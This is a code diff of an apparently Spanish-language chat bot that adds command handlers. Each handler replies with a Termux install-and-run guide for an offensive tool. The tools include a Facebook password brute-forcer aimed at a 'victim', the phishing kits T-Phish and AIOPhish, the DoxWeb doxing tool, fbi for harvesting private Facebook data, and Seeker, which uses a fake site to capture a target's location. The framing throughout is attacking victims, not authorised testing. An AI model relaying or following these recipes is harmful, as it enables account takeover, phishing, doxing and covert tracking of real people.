@@ -3228,7 +3228,7 @@ Michael domina`)
 ...ɴᴏ ᴘᴇᴅɪʀ ᴇʟ ᴍɪꜱᴍᴏ ᴄᴏᴍᴀɴᴅᴏ ᴀ ᴄᴀᴅᴀ ʀᴀᴛᴏ, ᴇꜱ ᴜɴ ᴘᴏᴄᴏ ʟᴇɴᴛᴏ -_-`)
                   }
 			
-	if (budy.includes(`/menu 2`)) {
+	if (budy.includes(`/menu Termux`)) {
                   reply(`⊱✦•𝑴𝑬𝑵𝑼 𝑫𝑬𝑳 𝑩𝑶𝑻⸙۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪۪ࣤ
  
 ╭┅┅┅ⒸⓄⓂⒶⓃⒹⓄⓈ┅┅┅🌐
@@ -3741,6 +3741,231 @@ run
 [Comenzar]
 
 AQUÍ SE ALMACENARAN LOS DATOS DE LA VÍCTIMA, PARA ELLO TIENES QUE ENVIAR EL LINK QUE ESTA EN TU SESIÓN DE NGROK.`)
+                  }
+					
+		if (budy.includes(`/fuerza bruta facebook`)) {
+                  reply(`📲ATAQUES DE FUERZA BRUTA A LA RED SOCIAL "FACEBOOK" EN TERMUX (ANDROID)📲
+
+📲¿Qué es fuerza bruta?📲
+
+La fuerza bruta en el ámbito de la informática, es un método hacking en el cual, el atacante intenta descifrar la contraseña de su víctima por medio de una combinación de contraseñas generadas con información recopilada de esta misma.
+
+
+✅REQUISITOS✅
+
+☑️ Aplicación Termux
+☑️ Navegador Chrome
+☑️ Perfil de Facebook (Víctima)
+
+
+Ahora que ya tenemos los requisitos, comenzamos con la instalación:
+
+$ apt update && apt upgrade -y
+$ termux-setup-storage
+$ apt install -y python
+$ apt install -y python2
+$ apt install -y python2-dev
+$ apt install pip2
+$ pip2 install mechanize
+$ apt  install -y git
+$ git clone https://github.com/perjayro/Facebook_brute.git
+$ cd Facebook_brute
+$ chmod +x brute.py
+$ python2 brute.py
+
+EL ID de la víctima
+
+CONTRASEÑA
+pass.txt
+pass1.txt
+pass2.txt
+pass3.txt`)
+                  }
+					
+		if (budy.includes(`/wiki-termux`)) {
+                  reply(`🌎¿Qué es Wiki-Termux?🌎
+
+wiki-termux, como su nombre lo dice, es una guía o manual que contiene información acerca del uso de Termux y de algunas herramientas que son compatibles con ésta terminal.
+
+📱INSTALACIÓN DE wiki-termux EN TERMUX (ANDROID)📱
+
+$ apt update && apt upgrade -y
+$ termux-setup-storage
+$ pkg install -y git
+$ git clone https://github.com/HarrisSec/wiki-termux
+$ cd wiki-termux
+$ chmod 711 wiki
+$ ./wiki`)
+                  }
+					
+		if (budy.includes(`/t-phish`)) {
+                  reply(`📲¿Qué es T-Phish?📲
+
+T-Phish es una herramienta de phishing excelente y muy útil para usuarios móviles. Esta es una herramienta modificada
+
+📱Guía de instalación y uso📱
+
+$ apt-get update -y
+$ apt-get upgrade -y
+$ pkg install git -y
+$ git clon https://github.com/Stephin-Franklin/T-Phish
+$ ls
+$ cd T-Phish
+$ ls
+$ descomprimir T-Phish
+$ cd T-Phish
+$ descomprimir T-Phish.zip
+$ chmod 777 start.sh
+$ ./start.sh
+$ ./phish.sh`)
+                  }
+					
+		if (budy.includes(`/red_hawk`)) {
+                  reply(`📲Red_Hawk📲
+
+Todo en una herramienta para recopilar información, escanear y rastrear vulnerabilidades. Una herramienta imprescindible para todos los probadores de penetración.
+
+📱La Instalación la encontrarán en github📱
+
+https://github.com/Tuhinshubhra/RED_HAWK`)
+                  }
+					
+		if (budy.includes(`/doxweb`)) {
+                  reply(`📲¿Qué es DoxWeb?📲
+
+DoxWeb es una herramienta que utiliza diversos sitios web para recopilar información de un usuario, es decir, es una herramienta de Doxing.
+
+📲INSTALACIÓN DE DoxWeb EN TERMUX (ANDROID)📲 
+
+$ termux-setup-storage?
+$ apt update && apt upgrade -y
+$ termux-setup-storage
+$ pkg install -y git
+$ git clone https://github.com/TermuxHacking000/DoxWeb
+$ cd DoxWeb
+$ chmod 711 DoxWeb.sh
+$ ./DoxWeb.sh`)
+                  }
+					
+		if (budy.includes(`/recon-spider`)) {
+                  reply(`📲ReconSpider📲
+
+ReconSpider es el marco más avanzado de inteligencia de código abierto (OSINT) para escanear direcciones IP, correos electrónicos, sitios web, organizaciones y obtener información de diferentes fuentes.
+
+🔒ReconSpider puede ser utilizado por investigadores de Infosec, probadores de penetración, cazadores de insectos e investigadores de delitos cibernéticos para encontrar información detallada sobre su objetivo.🔒
+
+📲ReconSpider agrega todos los datos sin procesar, los visualiza en un tablero y facilita la alerta y el monitoreo de los datos.📲
+
+🌎Recon Spider también combina las capacidades de Wave , Photon y Recon Dog para hacer una enumeración completa de la superficie de ataque.🌎
+
+
+Descripción general de la herramienta:
+Realiza escaneo OSINT en una dirección IP, correos electrónicos, sitios web, organizaciones y descubre información de diferentes fuentes.
+Correlaciona y colabora los resultados, muéstralos de manera consolidada.
+Utilice un script específico / inicie OSINT automatizado para datos consolidados.
+Actualmente disponible solo en la interfaz de línea de comandos (CLI).
+
+
+Configuración del entorno (sistema operativo Linux)
+Paso 1: Clonación de ReconSpider en su sistema Linux.
+
+Para descargar ReconSpider, simplemente clone el repositorio de github. A continuación se muestra el comando que puede utilizar para clonar el repositorio de ReconSpider.
+
+git clone https://github.com/bhavsec/reconspider.git
+Paso 2: asegúrese de que python3 y python3-pip estén instalados en su sistema.
+
+También puede realizar una verificación escribiendo este comando en su terminal.
+
+sudo apt install python3 python3-pip
+Paso 3: instalación de todas las dependencias.
+
+Una vez que clone y verifique la instalación de Python, encontrará el nombre del directorio como reconspider . Simplemente vaya a ese directorio e instálelo usando estos comandos:
+
+cd reconspider
+sudo python3 setup.py install`)
+                  }
+					
+		if (budy.includes(`/fsociety`)) {
+                  reply(`📲Fsociety📲
+
+Un marco de prueba de penetración, tendrá todos los scripts que necesita un pirata informático. Funciona con Python 2. Para obtener una versión de Python 3, consulte nuestra versión actualizada en fsociety-team/fsociety.
+
+📲Instalación 📲
+
+$ pkg install git
+$ git clone https://github.com/Manisso/fsociety.git
+$ cd fsociety && ls
+$ chmod +x fsociety.py
+$ python2 fsociety.py`)
+                  }
+					
+		if (budy.includes(`/fbi`)) {
+                  reply(`📲¿Qué es Fbi?📲
+
+🔒 fbi (facebook information) es un herramienta de información gathering precisa de una cuenta de Facebook. Toda la información confidencial se puede recopilar fácilmente a pesar de que el objetivo/víctima convierta toda su privacidad a (solo para mí), información confidencial sobre residencia, fecha de nacimiento, ocupación, número de teléfono y dirección de correo electrónico. 🔒
+
+🔒INSTALACIÓN DE fbi EN TERMUX (ANDROID)🔒
+
+$ apt update && apt upgrade -y
+$ termux-setup-storage
+$ pkg install -y git
+$ pkg install -y python
+$ pkg install -y python2
+$ git clone https://github.com/xHak9x/fbi.git
+$ cd fbi
+$ pip2 install -r requirements.txt
+$ python2 fbi.py
+
+token
+
+ESCRIBIR TU CUENTA DE FACEBOOK
+
+python2 fbi.py
+
+get_data
+
+help`)
+                  }
+					
+		if (budy.includes(`/seeker`)) {
+                  reply(`📲¿Qué es Seeker?📲
+
+🌐Seeker aloja un sitio web falso en un servidor php y usa serveo para generar un enlace que reenviaremos al objetivo, el sitio web solicita permiso de ubicación y, si el objetivo lo permite, podemos obtener:🌐
+
+[Longitud], [Latitud], [Exactitud], [Altitud], [Dirección], [Velocidad]
+
+Junto con la información de ubicación, también obtenemos información del dispositivo sin ningún permiso:
+
+[Sistema operativo], [Plataforma], [Número de núcleos de CPU], [Cantidad de RAM - Resultados aproximados], [Resolución de la pantalla], [Información de la GPU], [Nombre y versión del navegador], [Dirección IP pública], [Reconocimiento de direcciones IP].
+
+📱INSTALACIÓN DE seeker EN TERMUX (ANDROID)📱
+
+$ apt update && apt upgrade -y
+$ termux-setup-storage
+$ pkg install -y git
+$ pkg install -y python
+$ pkg install -y python2
+$ pkg install -y openssh
+$ pkg install -y php
+$ git clone https://github.com/thewhiteh4t/seeker
+$ cd seeker
+$ python seeker.py`)
+                  }
+					
+		if (budy.includes(`/aiophish`)) {
+                  reply(`📱¿Qué es AIOPhish?📱
+
+AIOPhish es una herramienta de phishing con 40 plantillas preconfiguradas, además, se especializa en la ingenieria social, ya que, nos brinda la opción de añadir una imagen, título y descripción al enlace y de ésta forma aumentar las probabilidades de que nuestra víctima acceda al enlace, puedes elegir el túnel y como extra tiene su respectivo menu de ayuda con un acortador de URL.
+
+📱INSTALACIÓN DE AIOPhish EN TERMUX (ANDROID)📱
+
+$ apt update && apt upgrade -y
+$ termux-setup-storage
+$ pkg install -y git
+$ git clone https://github.com/kepxy/AIOPhish
+$ cd STP
+$ bash install-termux.sh
+$ bash aiophish.sh`)
                   }
        if (budy.startsWith(`:v`)) {
         const none = fs.readFileSync('./mp3/viejo1.mp3');
